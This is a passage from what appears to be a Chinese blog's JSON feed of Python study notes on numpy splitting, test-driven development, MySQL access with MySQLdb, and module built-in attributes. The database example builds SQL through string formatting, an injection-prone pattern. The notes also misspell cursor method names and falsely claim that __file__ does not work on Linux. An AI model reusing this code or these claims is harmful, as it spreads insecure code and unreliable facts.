class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> axis<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># split 函数横向分割</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'纵向分割为：'</span><span class=\"token punctuation\">,</span> np<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> axis<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># split 函数纵向分割</span></pre></td></tr></table></figure>",
            "tags": [
                "数据分析"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/%E5%88%9D%E8%AF%86python%E6%B5%8B%E8%AF%95%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/",
            "url": "https://or0kit.github.io/Programming/Python/%E5%88%9D%E8%AF%86python%E6%B5%8B%E8%AF%95%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/",
            "title": "初识python测试驱动开发",
            "date_published": "2021-02-07T12:20:18.000Z",
            "content_html": "<h1 id=\"导读\"><a class=\"anchor\" href=\"#导读\">#</a> 导读</h1>\n<p>本章主要介绍敏捷开发模式。敏捷开发是 20 世纪 90 年代兴起的一种新型软件开发方法，能快速应对需求的变化。他需要分析人员与程序开发人员紧密协作，采用面对面的有效沟通方式频繁交付新的软件版本。测试驱动是敏捷开发的重要组成部分，python 是敏捷开发项目常采用的一种语言。本章重点介绍测试驱动开发的特点、步骤和环境建立，以及 Python 单元测试，doctest 和 Epydoc 的使用。</p>\n<h1 id=\"正文\"><a class=\"anchor\" href=\"#正文\">#</a> 正文</h1>\n<h2 id=\"测试驱动开发\"><a class=\"anchor\" href=\"#测试驱动开发\">#</a> 测试驱动开发</h2>\n<p>测试驱动开发 (Test-Driven-Development)，简称 TDD，是一种有别于传统开发的新型开发方法。它要求在编写某个功能的代码之前先编写测试代码，让后编写是测试通过的代码，通过测试来推动整个开发的进行。这有助于编写简洁可用和高质量的代码，以便加速开发进程。</p>\n<h3 id=\"测试驱动开发模式tdd\"><a class=\"anchor\" href=\"#测试驱动开发模式tdd\">#</a> 测试驱动开发模式 (TDD)</h3>\n<p>当下科技高速发展，软件规模越来越大，软件开发人员也越来越多，因此软件开发过程必须要有知道开发的软件模式。一些小项目也许可以采用边做边改的开发模式，项目一旦做大，这样的开发模式就不能满足需求了。</p>\n<p>瀑布模型作为传统的开发模式，曾一度受到追捧，它将软件生命周期划外为制定计划，需求分析、软件设计、程序开发、软件测试和运行维护六个阶段，这六个阶段的各项活动严格按照线性方式进行，每一个阶段的工作成果都需要进行验证，验证通过才能进入下一阶段，否则返回修改。</p>\n<p>传统的开发模型除了瀑布模型外，还有造代模型、快速原型模型、增量模型、螺旋模型，但这些模型都有自身的缺点，如何适应瞬息万变的需求变化，如何高效地实施软件开发，是每个软件行业人员必须思考的问题。</p>\n<p>敏捷开发在这样的环境下应运而生，它是一种以人为核心、迭代、循序渐进的开发方法，开发过程中，软件项目的构建被切分成多个子项目，各个子项目既相对独立又相互联系，可以分别完成，开发过程中软件一直处于可使用状态。</p>\n<p>测试驱动开发模式 TDD 是敏捷开发的重要组成部分，也是一种设计方法论，其基本思想就是在开发某个功能代码前，先编写测试代码，然后编写功能代码并用测试代码进行验证，如此循环直到完成全部功能的开发。</p>\n<p>测试模型中的 V 模型和 X 模型都是 TDD 的最好体现方式，V 模型如图所示：</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>V 模型在开发的各个阶段，包括需求分析、概要设计、详细设计、编码过程中都考虑相对应的测试工作，完成相关的测试用例设计和测试脚本编写。</p>\n<p>X 模型是对详细阶段和编码阶段进行建模，针对某个功能进行对应的测试驱动开发。X 模型的左侧描述的是针对单独程序片段所进行的相互分离的编码和测试，此后进行频繁的集成，通过集成最终成为可执行的程序，然后再对这些可执行程序进行测试. X 模型还定位了探索性测试，这是不进行事先计划的特殊类型的测试，这一方式往往能帮助有经验的测试人员在测试计划之外发现更多的软件错误。</p>\n<p>X 模型如图所示</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<p>TDD 的优点：节省了调试程序及挑错的时间，在任意一个开发节点都可以拿出一个可以使用含少量 bug 并具有一定功能和能够发布的产品。<br />\nTDD 的缺点：增加代码量，测试代码是系统代码的两倍或更多倍。</p>\n<h3 id=\"tdd使用步骤\"><a class=\"anchor\" href=\"#tdd使用步骤\">#</a> TDD 使用步骤</h3>\n<p>TDD 在满足软件开发目标的同时，也要实现代码的简单整洁。<br />\n在明确软件需求后，对一个新功能的开发过程包括以下步骤，如图 4-3 所示。<br />\n步骤 01: 明确当前代码要完成的功能。可以记录成一个列表，必要时需写相关接口。<br />\n步骤 02: 快速新增对要完成功能的测试。<br />\n步骤 03 : 运行测试，判断测试代码是否通过，通过则执行步骤 06, 不通过则执行步骤 04。<br />\n步骤 04: 编写对应的功能代码。<br />\n步骤 05 : 重新运行测试，保证全部通过。<br />\n步骤 06: 对代码进行重构，优化代码结构。<br />\n步骤 07: 循环完成所有功能的开发。</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<h3 id=\"tips\"><a class=\"anchor\" href=\"#tips\">#</a> Tips</h3>\n<p>要完成一个系统，代码的功能点可能很多，需求也可能随时变化，任何阶段想添加功能，都应吧相关的功能点加到测试列表中，避免疏漏。</p>\n<h2 id=\"unittest测试框架\"><a class=\"anchor\" href=\"#unittest测试框架\">#</a> unittest 测试框架</h2>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veW91bGl4aXNoaS9hcnRpY2xlcy8zNTUxOTkyLmh0bWw=\">https://www.cnblogs.com/youlixishi/articles/3551992.html</span><br />\n《python 网络编程从入门到精通》</p>\n",
            "tags": [
                "测试"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/python%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BC%96%E7%A8%8B/",
            "url": "https://or0kit.github.io/Programming/Python/python%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BC%96%E7%A8%8B/",
            "title": "python数据库编程",
            "date_published": "2021-02-07T08:36:30.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>在看《python 网络编程从入门到精通》，顺便做个笔记。</p>\n<h1 id=\"正文\"><a class=\"anchor\" href=\"#正文\">#</a> 正文</h1>\n<p><ins>本章以 MySQL 为例说明</ins></p>\n<p>python 操作数据库主要涉及 connection 和 cursor 两个对象，操作流程图如下：</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<h2 id=\"connection对象\"><a class=\"anchor\" href=\"#connection对象\">#</a> connection 对象</h2>\n<p>connection 对象，与数据源唯一的会话，可以使用 connection 对象的集合、方法、属性实现与数据的连接。</p>\n<p><span class=\"label\">connection 参数列表</span></p>\n<table>\n<tbody>\n<tr>\n<td style=\"text-align:left\">参数名</td>\n<td style=\"text-align:left\">类型</td>\n<td style=\"text-align:left\">说明</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">host</td>\n<td style=\"text-align:left\">字符串</td>\n<td style=\"text-align:left\">连接数据库服务器主机名，默认为本地主机 (localhost)</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">port</td>\n<td style=\"text-align:left\">数字</td>\n<td style=\"text-align:left\">MySQL 服务器端口号，默认是 3306</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">user</td>\n<td style=\"text-align:left\">字符串</td>\n<td style=\"text-align:left\">连接数据库的用户名</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">password</td>\n<td style=\"text-align:left\">字符串</td>\n<td style=\"text-align:left\">连接数据库的密码</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">db</td>\n<td style=\"text-align:left\">字符串</td>\n<td style=\"text-align:left\">数据库名称</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">charset</td>\n<td style=\"text-align:left\">字符串</td>\n<td style=\"text-align:left\">连接编码</td>\n</tr>\n</tbody>\n</table>\n<p><span class=\"label\">connection 方法列表</span></p>\n<table>\n<tbody>\n<tr>\n<td style=\"text-align:left\">方法名</td>\n<td style=\"text-align:left\">说明</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">cursor()</td>\n<td style=\"text-align:left\">使用该连接创建并返回游标</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">commit()</td>\n<td style=\"text-align:left\">提交当前事务</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">rollback()</td>\n<td style=\"text-align:left\">回滚当前事务</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">close()</td>\n<td style=\"text-align:left\">关闭连接</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"cursor对象\"><a class=\"anchor\" href=\"#cursor对象\">#</a> cursor 对象</h2>\n<p>cursor 对象是游标对象，用户可以用它查询和获取结果。</p>\n<p><span class=\"label\">cursor 对象方法列表</span></p>\n<table>\n<tbody>\n<tr>\n<td style=\"text-align:left\">方法名</td>\n<td style=\"text-align:left\">说明</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">execute</td>\n<td style=\"text-align:left\">执行一个数据库命令</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">fecthone</td>\n<td style=\"text-align:left\">取结果集下一行</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">fechmany(size)</td>\n<td style=\"text-align:left\">取结果集下几行</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">fechall()</td>\n<td style=\"text-align:left\">取结果集中剩余的所有行</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">rowcount</td>\n<td style=\"text-align:left\">最近一次 execute 返回数据的行数或影响行数</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">close()</td>\n<td style=\"text-align:left\">关闭游标对象</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"一个例子\"><a class=\"anchor\" href=\"#一个例子\">#</a> 一个例子</h2>\n<p>搬一个菜鸟教程里<ins>插入操作</ins>的例子。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># -*- coding: UTF-8 -*-</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> MySQLdb</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 打开数据库连接</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>db <span class=\"token operator\">=</span> MySQLdb<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token string\">\"localhost\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"testuser\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"test123\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"TESTDB\"</span><span class=\"token punctuation\">,</span> charset<span class=\"token operator\">=</span><span class=\"token string\">'utf8'</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># 使用 cursor () 方法获取操作游标 </span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>cursor <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span>cursor<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># SQL 插入语句</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sql <span class=\"token operator\">=</span> \"INSERT INTO EMPLOYEE<span class=\"token punctuation\">(</span>FIRST_NAME<span class=\"token punctuation\">,</span> \\</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>       LAST_NAME<span class=\"token punctuation\">,</span> AGE<span class=\"token punctuation\">,</span> SEX<span class=\"token punctuation\">,</span> INCOME<span class=\"token punctuation\">)</span> \\</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>       VALUES <span class=\"token punctuation\">(</span><span class=\"token operator\">%</span>s<span class=\"token punctuation\">,</span> <span class=\"token operator\">%</span>s<span class=\"token punctuation\">,</span> <span class=\"token operator\">%</span>s<span class=\"token punctuation\">,</span> <span class=\"token operator\">%</span>s<span class=\"token punctuation\">,</span> <span class=\"token operator\">%</span>s <span class=\"token punctuation\">)</span>\" <span class=\"token operator\">%</span> \\</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>       <span class=\"token punctuation\">(</span><span class=\"token string\">'Mac'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Mohan'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'M'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>   <span class=\"token comment\"># 执行 sql 语句</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>   cursor<span class=\"token punctuation\">.</span>execute<span class=\"token punctuation\">(</span>sql<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>   <span class=\"token comment\"># 提交到数据库执行</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>   db<span class=\"token punctuation\">.</span>commit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>   <span class=\"token comment\"># 发生错误时回滚</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>   db<span class=\"token punctuation\">.</span>rollback<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># 关闭数据库连接</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>db<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "数据库编程"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/python%E6%A8%A1%E5%9D%97%E7%9A%84%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7/",
            "url": "https://or0kit.github.io/Programming/Python/python%E6%A8%A1%E5%9D%97%E7%9A%84%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7/",
            "title": "python模块的内置属性",
            "date_published": "2021-02-05T12:59:31.000Z",
            "content_html": "<h1 id=\"模块的内置属性\"><a class=\"anchor\" href=\"#模块的内置属性\">#</a> 模块的内置属性</h1>\n<p>对于任何一个 python 文件来说，当 python 解释器运行一个 py 文件，会自动将一些内容加载到内置的属性中；一个模块我们可以看做是一个比类更大的对象。</p>\n<h2 id=\"查看内置属性\"><a class=\"anchor\" href=\"#查看内置属性\">#</a> 查看内置属性</h2>\n<p>我们可以通过 dir () 方法获取该模块所有的显式或隐式属性。<br />\n附上 dir () 的介绍：<br />\n<img data-src=\"image001.png\" alt=\"\" /></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># -*- coding:utf-8 -*-</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>doc......</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>var <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">dir</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">####### 输出结果 #######</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'Test'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__annotations__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__builtins__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__cached__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__doc__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__file__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__loader__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__name__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__package__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'__spec__'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'os'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'var'</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><div class=\"note warning\">\n<p>这里有些内容不确定：<br />\n《python 网络编程从入门到精通》这本书上写原话是<br />\n <code>可以看到隐式属性有['Test', '__annotations__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'os', 'var']</code></p>\n<p>而在网上的<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY3dwLWJnL3AvOTg1NjMzOS5odG1s\"> https://www.cnblogs.com/cwp-bg/p/9856339.html</span> 博客中这样写的<br />\n <code>可看到隐式的属性有__annotations__,__builtins__,__cached__,__annotations__,__doc__,__file__,__loader__,__name__;</code></p>\n</div>\n<p>我们打印一下每个魔法属性：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>doc......</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>var <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\"># print(dir())</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__annotations__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__builtins__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__cached__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__doc__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__file__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__loader__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__package__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>__spec__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">######### 输出结果 ###############</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>__main__</pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token operator\">&lt;</span>module <span class=\"token string\">'builtins'</span> <span class=\"token punctuation\">(</span>built<span class=\"token operator\">-</span><span class=\"token keyword\">in</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>doc<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>G<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>Text_Files<span class=\"token operator\">/</span>py<span class=\"token operator\">/</span><span class=\"token number\">1.</span>py</pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token operator\">&lt;</span>_frozen_importlib_external<span class=\"token punctuation\">.</span>SourceFileLoader <span class=\"token builtin\">object</span> at <span class=\"token number\">0x0000018C7E37F8B0</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\">## 空行是打印时就有的</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\"># 其中__name__、__doc__、__file__、__package__是可以直接使用的，其它的内置属性一般不允许直接使用。</span></pre></td></tr></table></figure><h2 id=\"内置魔法属性\"><a class=\"anchor\" href=\"#内置魔法属性\">#</a> 内置魔法属性</h2>\n<ol>\n<li>\n<p>_<em>name</em>_<br />\n该属性代表当前模块的名字，每个 py 文件默认的属性，如果当前模块是主程序，值为 “<strong>main</strong>”，如果不是主程序，值为模块名。这个属性经常用来区分主程序和作为被导入模块的程序。</p>\n</li>\n<li>\n<p>_<em>builtins</em>_<br />\n该属性代表内置模块 builtins，即所有的内建函数、内置类型、内置异常等；在 python 执行一个 py 文件时，会将内置模块赋值给这个属性；如果不是主程序，那么这个属性是一个 builtins 模块所有方法的字典。</p>\n</li>\n<li>\n<p>_<em>doc</em>_<br />\n模块的说明文档，py 文件初始化时，将文件开始的说明字符串赋值给这个属性。</p>\n</li>\n<li>\n<p>_<em>file</em>_<br />\n该属性代表文件的绝对路径，任何一个模块使用这个属性就可获得本模块的绝对路径；但是该属性只在 windows 环境下可用，在 linux 环境下不可用。</p>\n</li>\n<li>\n<p>_<em>cached</em>_<br />\n缓存文件，如果是主程序，那么该属性为 None，其他模块的该属性指向该模块的 pyc 字节文件，这样在 py 文件不发生修改的情况下可以减少编译的时间，更快地加载上下文环境。</p>\n</li>\n<li>\n<p>_<em>annotations</em>_<br />\n该属性对于模块文件来说，没有开放给用户使用；但对于函数来说，这个方法用来记录参数的类型和返回值。</p>\n</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_sum</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">return</span> x <span class=\"token operator\">+</span> y</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>get_sum<span class=\"token punctuation\">.</span>__annotations__<span class=\"token punctuation\">)</span> <span class=\"token comment\">#输出结果 &#123;&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_sum</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">return</span> x <span class=\"token operator\">+</span> y</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>get_sum<span class=\"token punctuation\">.</span>__annotations__<span class=\"token punctuation\">)</span> <span class=\"token comment\"># &#123;'y': &lt;class 'int'>, 'return': &lt;class 'int'>&#125;</span></pre></td></tr></table></figure><p>函数的参数和返回值如果在定义的时候指定了类型，那么它们就会以键值对的形式记录到函数的__annotations__属性中，但对于匿名函数来说，这个属性是不存在的。</p>\n<ol start=\"7\">\n<li>\n<p>_<em>loader</em>_<br />\n该属性 py3.3 之前没有，引用了本模块的加载器对象，即该模块的上下文是由这个加载器加载到内存中的。</p>\n</li>\n<li>\n<p>_<em>package</em>_<br />\n该属性是一个文件是否是包的标志，在主程序中该属性的值永远是 None，不要使用它；当一个包被导入到主程序中，该包的__package__属性为包的名字。</p>\n</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># test</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token operator\">-</span><span class=\"token operator\">-</span>__init__<span class=\"token punctuation\">.</span>py</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># main.py</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> test</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">.</span>__package__<span class=\"token punctuation\">)</span> <span class=\"token comment\"># test</span></pre></td></tr></table></figure><ol start=\"9\">\n<li><em>spec</em><br />\n 该属性记录一个模块的详细信息，是一个 ModuleSpec 对象，</li>\n</ol>\n<h2 id=\"其他魔法属性\"><a class=\"anchor\" href=\"#其他魔法属性\">#</a> 其他魔法属性</h2>\n<ol>\n<li><em>author</em><br />\n 该属性用来定义模块的作者信息，可以是字符串，也可以是列表、字典等数据结构。</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 可以在 python 文件中加入</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>__author__ <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'auth'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'1asy'</span><span class=\"token punctuation\">;</span><span class=\"token string\">'bg'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'https://self-ferry.github.io/'</span><span 